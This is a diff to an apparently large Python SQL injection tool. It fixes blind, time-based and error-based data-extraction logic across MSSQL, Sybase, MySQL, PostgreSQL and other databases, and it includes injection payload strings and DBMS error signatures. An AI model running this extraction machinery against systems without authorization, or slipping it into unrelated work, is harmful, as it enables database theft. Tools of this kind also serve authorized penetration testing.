@@ -46022,7 +46022,7 @@ async def blind_extract_string(engine,config,queries,sql_query,result,method,url
         # NEVER modified — only the inner subquery gains TOP 1 to make it scalar.
         if _detected_dbms_bls in ("MSSQL", "Sybase") and sql_query and 'SELECT' in (sql_query or '').upper():
             try:
-                sql_query = _mssql_top1_subquery(sql_query)
+                sql_query = _mssql_top1_subquery(sql_query, sybase=(_detected_dbms_bls == "Sybase"))
                 LOG.debug(f"[Extraction] _mssql_top1_subquery applied for {_detected_dbms_bls} "
                           "(BUG-V172-BLS-MSSQL-CHARFUNC-NO-TOP1 fix)")
             except Exception as _mssql_top1_err:
@@ -46057,7 +46057,7 @@ async def blind_extract_string(engine,config,queries,sql_query,result,method,url
         # String delimiters in _null_sentinel_wrap are confined to the SQL literal '[NULL]'
         # and are never rewritten by obfuscation layers (_safe_tokenize preserves literals;
         # _is_functional_number protects comparison operands >=64, =1, etc.).
-        _nullable_techs = ("B", "BH", "E", "EH", "U", "UE", "UH", "S", "IN", "ST", "NV", "WB", "EX", "HY")
+        _nullable_techs = ("B", "BH", "BT", "E", "EH", "U", "UE", "UH", "S", "IN", "ST", "NV", "WB", "EX", "HY")
         _sql_upper_nullchk = (sql_query or "").upper()
         _already_null_safe = any(kw in _sql_upper_nullchk for kw in ("NVL(", "COALESCE(", "ISNULL(", "IFNULL("))
         # BUG-NULL-SENTINEL-TIDB-CRDB-YGB-REDSHIFT FIX (MEDIUM): TiDB (MySQL-compat),
@@ -46919,7 +46919,7 @@ def _oracle_ensure_dual(sql: str) -> str:
     if not _has_top_level_from:
         sql_stripped = sql_stripped + ' FROM DUAL'
     return sql_stripped
-def _mssql_top1_subquery(sql: str) -> str:
+def _mssql_top1_subquery(sql: str, sybase: bool = False) -> str:
     """
     Wrap MSSQL subquery SELECTs to include TOP 1 and ORDER BY (SELECT NULL).
 
@@ -46998,7 +46998,10 @@ def _mssql_top1_subquery(sql: str) -> str:
                 if ('TOP' not in inner_upper and 'ROWNUM' not in inner_upper
                         and 'FOR XML PATH' not in inner_upper):
                     if 'ORDER BY' not in inner_upper:
-                        result.append(f"(SELECT TOP 1 {inner} ORDER BY (SELECT NULL))")
+                        if sybase:
+                            result.append(f"(SELECT TOP 1 {inner})")
+                        else:
+                            result.append(f"(SELECT TOP 1 {inner} ORDER BY (SELECT NULL))")
                     else:
                         result.append(f"(SELECT TOP 1 {inner})")
                     i = k  # advance past the closing ')'
@@ -57479,9 +57482,11 @@ class Scanner:
                 # the bisection to converge at lo=32 → chr(32)=' ' returned silently.
                 # Fix: give SQLite its own ceiling of 1114111 (full Unicode) so the bisection
                 # correctly tests the full range UNICODE() can return.
-                _alt_bet_hi = (1114111 if _dbms == "SQLite"
+                _alt_bet_hi = (1114111 if _dbms in ("SQLite", "MySQL", "MariaDB", "TiDB",
+                                                    "PostgreSQL", "CockroachDB", "YugabyteDB",
+                                                    "Redshift")
                                else 65535 if _dbms in ("MSSQL", "Sybase", "Oracle")
-                               else 255)
+                               else 1114111)
                 # The bisection applies _effective_mid = mid+1 when BETWEEN is detected.
                 # So BETWEEN {mid} AND N → BETWEEN mid+1 AND N = ASCII > mid (strict).
                 # This is correct and consistent with lo = mid+1 when True.
@@ -57773,8 +57778,8 @@ class Scanner:
                     _val |= _nb_mask
             # If too many high-order bits are still None, the oracle can't resolve this char
             _high_none = sum(1 for m in _none_bits_still_none if m >= 128)
-            if _high_none >= 3:
-                return None  # too much ambiguity in high-order bits — skip this char
+            if _high_none >= 1:
+                return None  # any unresolved high-order bit makes the char value unreliable
             # BUG-BITWISE-UNICODE-HI FIX: was `32 <= _val <= 255` — the 255 cap discarded
             # all non-Latin-1 Unicode characters (code points 256-65535 for MSSQL/Sybase,
             # 256-1114111 for SQLite) as None.  MSSQL/Sybase use UNICODE() which returns
@@ -59601,7 +59606,10 @@ class Scanner:
                 # say True → cap is correct.  A healthy oracle with a real max_len-length
                 # string will say False → no cap.
                 if _length >= max_len and max_len >= 64:
-                    _over_cond = _len_tpl.replace("[QUERY]", query).replace("{mid}", str(max_len))
+                    _over_mid = (max_len + 1 if (">=" in _len_tpl or "BETWEEN" in _len_tpl.upper()
+                                                  or ("NOT" in _len_tpl.upper() and "<{mid}" in _len_tpl))
+                                 else max_len)
+                    _over_cond = _len_tpl.replace("[QUERY]", query).replace("{mid}", str(_over_mid))
                     _oracle_beyond = await _eval_confirm(_over_cond)  # Use confirmation for reliability
                     if _oracle_beyond is True:
                         # Oracle claims length > max_len → definitely stuck at ceiling
@@ -59886,7 +59894,8 @@ class Scanner:
                 # (Unit Separator) is not printable; the correct lower bound is 32
                 # (space).  Also test for "BETWEEN" explicitly so the null-check uses
                 # the correct floor regardless of which operator mode is active.
-                _null_mid = "32" if (">=" in _op_char_tpl or "BETWEEN" in _op_char_tpl) else "31"
+                _null_mid = "32" if (">=" in _op_char_tpl or "BETWEEN" in _op_char_tpl or
+                                     ("NOT" in _op_char_tpl.upper() and "<" in _op_char_tpl)) else "31"
                 _null_cond = _op_char_tpl.replace("[QUERY]", query).replace("{pos}", str(pos)).replace("{mid}", _null_mid)
                 _has_char = await _cached_eval(_null_cond)
                 if _has_char is False:
@@ -60699,7 +60708,7 @@ class Scanner:
                 _, ms_t = await _send_payload(_cal_true_cond)
                 await asyncio.sleep(_delay)
                 _, ms_f = await _send_payload(_cal_false_cond)
-                if ms_t > 30 and ms_f > 30:
+                if ms_t > 30 and ms_f > 30 and ms_t > ms_f:
                     _thresh = (ms_t + ms_f) / 2
                 result = await _extract_string(query, label + "_retry", max_len)
             return result
@@ -60924,7 +60933,8 @@ class Scanner:
             # do not contain ">=" so the old expression `">=" in _op_char_tpl` returned
             # False, producing _null_mid2="31" → "BETWEEN 31 AND 255".  ASCII 31 is not
             # printable; the correct lower bound for both >= and BETWEEN mode is 32.
-            _null_mid2 = "32" if (">=" in _op_char_tpl or "BETWEEN" in _op_char_tpl) else "31"
+            _null_mid2 = "32" if (">=" in _op_char_tpl or "BETWEEN" in _op_char_tpl or
+                                   ("NOT" in _op_char_tpl.upper() and "<" in _op_char_tpl)) else "31"
             _null_cond = _op_char_tpl.replace("[QUERY]", query).replace("{pos}", str(pos)).replace("{mid}", _null_mid2)
             _has = await _cached_eval(_null_cond)
             if not _has:
@@ -61002,11 +61012,21 @@ class Scanner:
             if _length == 0:
                 return ""
             if _length > 0:
-                # Guard: ceiling hit  oracle likely broken
+                # Guard: ceiling hit → oracle may be broken OR string genuinely equals max_len
                 if _length >= max_len and max_len >= 64:
-                    LOG.warning("[Inference] %s: length=%d hit max_len ceiling (parallel)  "
-                                "capping at 32", label, _length)
-                    _length = 32
+                    _over_mid_par = (max_len + 1 if (">=" in _len_tpl or "BETWEEN" in _len_tpl.upper()
+                                                      or ("NOT" in _len_tpl.upper() and "<{mid}" in _len_tpl))
+                                     else max_len)
+                    _over_cond_par = _len_tpl.replace("[QUERY]", query).replace("{mid}", str(_over_mid_par))
+                    _oracle_beyond_par = await _eval_confirm(_over_cond_par)
+                    if _oracle_beyond_par is True:
+                        LOG.warning("[Inference] %s: length=%d hit max_len ceiling (parallel) "
+                                    "oracle confirms beyond-ceiling → oracle unreliable, capping at 32",
+                                    label, _length)
+                        _length = 32
+                    else:
+                        LOG.info("[Inference] %s: length=%d equals max_len (parallel) — confirmed true length",
+                                 label, _length)
                 max_len = _length
                 LOG.info("[Inference] %s: length=%d (parallel%d)", label, _length, concurrency)
             else:
@@ -69988,7 +70008,7 @@ async def blind_extract_string_v5(
     # changed; comparison operands and function names are never modified.
     if _bes5_dbms in ("MSSQL", "Sybase") and sql_query and 'SELECT' in (sql_query or '').upper():
         try:
-            sql_query = _mssql_top1_subquery(sql_query)
+            sql_query = _mssql_top1_subquery(sql_query, sybase=(_bes5_dbms == "Sybase"))
             LOG.debug(f"[v5 Extraction] _mssql_top1_subquery applied for {_bes5_dbms} "
                       "(BUG-V172-BLS5-MSSQL-CHARFUNC-NO-TOP1 fix)")
         except Exception as _bes5_mssql_err:
@@ -84330,7 +84350,7 @@ class BitwiseExtractor:
                 pass
         if dbms in ("MSSQL", "Sybase") and _bext_sql and 'SELECT' in (_bext_sql or '').upper():
             try:
-                _bext_sql = _mssql_top1_subquery(_bext_sql)
+                _bext_sql = _mssql_top1_subquery(_bext_sql, sybase=(dbms == "Sybase"))
             except Exception:
                 pass  # non-fatal; error 512 will surface at probe time
         len_func = _build_dbms_len_func(_bext_sql, self.queries, dbms)
@@ -90228,10 +90248,14 @@ class ScannerV10(ScannerV9):
                             r'all_objects|DBA_OBJECTS|dba_objects|DBMS_UTILITY\.GET_TIME'
                             r'|sys\.all_objects|SYS\.ALL_OBJECTS|SYS\.DBA_OBJECTS',
                             (_det_pay_ts or ''), _re.IGNORECASE))
-                        _is_mssql_hq_rpc = bool(_re.search(
-                            r'sys\.objects|sysobjects|syscolumns|sys\.columns|sys\.tables'
-                            r'|sys\.all_objects|INFORMATION_SCHEMA\.COLUMNS.*JOIN',
-                            (_det_pay_ts or ''), _re.IGNORECASE))
+                        _is_mssql_hq_rpc = (
+                            bool(_re.search(
+                                r'sys\.objects|sysobjects|syscolumns|sys\.columns|sys\.tables'
+                                r'|sys\.all_objects|sys\.all_columns',
+                                (_det_pay_ts or ''), _re.IGNORECASE)) or (
+                            bool(_re.search(r'INFORMATION_SCHEMA\.COLUMNS', (_det_pay_ts or ''), _re.IGNORECASE)) and
+                            bool(_re.search(r'\bJOIN\b', (_det_pay_ts or ''), _re.IGNORECASE)))
+                        )
                         if _is_ora_hq_rpc:
                             # BUG-3-D FIX: Unconditionally set Oracle threshold to 1500ms
                             # regardless of whether another DBMS already set a lower threshold.
@@ -90396,7 +90420,9 @@ class ScannerV10(ScannerV9):
                     # BUG-E-THRESH-GLOBAL-FIX (Req 3): was min(_ts2_thresh_map.values())
                     # — same cross-DBMS contamination as _run_pcv_check E/S/T path.
                     # Use current DBMS threshold instead of global minimum.
-                    cfg._pcv_timing_threshold = _new_ts2_thresh
+                    _existing_global = getattr(cfg, '_pcv_timing_threshold', 0) or 0
+                    if not _existing_global or _new_ts2_thresh < _existing_global:
+                        cfg._pcv_timing_threshold = _new_ts2_thresh
                 except (ValueError, TypeError):
                     if not getattr(cfg, '_pcv_timing_threshold', 0):
                         _t_sec = float(getattr(cfg, 'time_sec', 5) or 5)
@@ -93926,7 +93952,7 @@ class ZKBooleanExtractor:
         # SUBSTRING positional arguments, and comparison operands are never modified.
         if dbms in ("MSSQL", "Sybase") and _zk_sql and 'SELECT' in (_zk_sql or '').upper():
             try:
-                _zk_sql = _mssql_top1_subquery(_zk_sql)
+                _zk_sql = _mssql_top1_subquery(_zk_sql, sybase=(dbms == "Sybase"))
             except Exception:
                 pass  # non-fatal; error 512 will surface at probe time
 
@@ -106357,7 +106383,7 @@ class TechniqueCascadeEngine:
                 # Pass if: double-sleep ≥ threshold AND double ≥ half × 1.3
                 # (double should be roughly 4× half; 1.3× is a conservative lower bound
                 # to handle CDN jitter while still requiring proportional scaling)
-                _s_pcv_ok = (_d_ms >= _thresh and _d_ms > _h_ms * 1.3)
+                _s_pcv_ok = (_d_ms >= _thresh and (_h_ms <= 0 or _d_ms >= _h_ms * 1.3))
                 if _s_pcv_ok:
                     # BUG-3-A FIX: Add 2-probe anti-jitter (from dead second S block).
                     # A single proportional measurement is insufficient on variable-latency
@@ -108753,7 +108779,7 @@ class TechniqueCascadeEngine:
             # the body difference is dramatic but only one canary family fires.
             if len(_passing_pairs) == 1:
                 _g, _n, _s = _passing_pairs[0]
-                if _g > 0.80:
+                if _g >= 0.80:
                     # FIX-REQ3-SINGLESTRONG: Very strong single pair → accept, but not standalone-strong.
                     # Raising threshold from 0.60→0.80: dynamic pages (CDN A/B, personalization) can
                     # produce gap>0.60 by chance. _a_strong=False forces corroboration (C/D/E) instead
@@ -108884,8 +108910,6 @@ class TechniqueCascadeEngine:
             # raise "Incorrect integer value" / "Truncated incorrect DECIMAL value" errors.
             elif dbms == "MariaDB":
                 _c_fallbacks = [
-                    ("' AND 1/0-- -", "division"),
-                    (" AND 1/0-- -", "division-num"),
                     ("' AND CAST('abc' AS SIGNED)-- -", "CAST_signed"),
                     (" AND CAST('abc' AS SIGNED)-- -", "CAST_signed-num"),
                     ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
@@ -108962,7 +108986,7 @@ class TechniqueCascadeEngine:
                     "division by zero", "syntax error at or near", "invalid input syntax for type",
                     "relation does not exist", "column does not exist", "unterminated quoted identifier",
                     "pg_query()", "pg_exec()", "pg_prepare()", "pg_num_rows()",
-                    "psycopg2.", "npgsql.", "org.postgresql", "jdbc.postgresql",
+                    "npgsql.", "jdbc.postgresql",
                 ],
                 "MSSQL": [
                     "divide by zero error encountered", "conversion failed when converting",
@@ -109072,7 +109096,7 @@ class TechniqueCascadeEngine:
                 if _validate_response(_cfp, "response_body_check"):
                     _cbody = _safe_decode_body(_cfp, encoding="utf-8", errors="replace", func_name="extraction").lower()
                     
-                    if _c_status in (400, 500) and _bl_status not in (400, 500):
+                    if _c_status in (400, 500, 502, 503) and _bl_status not in (400, 500, 502, 503):
                         _any_status_500 = True
                         _status_500_count += 1
                     
@@ -109377,9 +109401,11 @@ class TechniqueCascadeEngine:
                 _d_false_p_num = f" AND {_substr_d}('SQLReaper',1,1)='X'-- -"
                 _d_fp_t_str, _, _, _ = await _pcv_send(_d_true_p_str)
                 _d_fp_f_str, _, _, _ = await _pcv_send(_d_false_p_str)
-                _str_ok = (_d_fp_t_str and _d_fp_f_str and
-                           _d_fp_t_str.body and _d_fp_f_str.body and
-                           len(_extract_body_safe(_d_fp_t_str)) != len(_extract_body_safe(_d_fp_f_str)))
+                _d_body_t = _extract_body_safe(_d_fp_t_str) if _d_fp_t_str else b""
+                _d_body_f = _extract_body_safe(_d_fp_f_str) if _d_fp_f_str else b""
+                _str_ok = (bool(_d_fp_t_str) and bool(_d_fp_f_str) and
+                           bool(_d_body_t) and bool(_d_body_f) and
+                           _d_body_t != _d_body_f)
                 if _str_ok:
                     _d_fps["true"]  = _d_fp_t_str
                     _d_fps["false"] = _d_fp_f_str
@@ -109860,7 +109886,7 @@ class TechniqueCascadeEngine:
                 _bl_fetch_ok                                              # BUG-FP-1: real baseline required
                 and _e_canary_ok                                          # BUG-FP-10: canary must not be error/WAF-block
                 and _e_direct_sim >= 0.80
-                and _det_sim < (1.0 - max(_gap_threshold, 0.25))
+                and _det_sim <= (1.0 - max(_gap_threshold, 0.25))
             )
             _details["E"] = (f"direct_sim={_e_direct_sim:.3f} "
                              f"det_sim={_det_sim:.3f} ctx={_e_ctx}")
@@ -142429,7 +142455,7 @@ class ChameleonExtractor:
         # _mssql_top1_subquery().
         if dbms in ("MSSQL", "Sybase") and sql_query and 'SELECT' in (sql_query or '').upper():
             try:
-                sql_query = _mssql_top1_subquery(sql_query)
+                sql_query = _mssql_top1_subquery(sql_query, sybase=(dbms == "Sybase"))
             except Exception as _ce_mssql_err:
                 pass  # non-fatal; error 512 will surface at char probe time
         # BUG-CE-LENF-MSSQL FIX (HIGH): The previous _ce_lf_fallback["MSSQL"] was
@@ -143081,7 +143107,7 @@ class AdaptiveFrequencyExtractor:
         # bigram update logic are never modified by _mssql_top1_subquery().
         if _afe_dbms_lf in ("MSSQL", "Sybase") and _afe_sql and 'SELECT' in (_afe_sql or '').upper():
             try:
-                _afe_sql = _mssql_top1_subquery(_afe_sql)
+                _afe_sql = _mssql_top1_subquery(_afe_sql, sybase=(_afe_dbms_lf == "Sybase"))
             except Exception:
                 pass  # non-fatal; error 512 will surface at char probe time
 
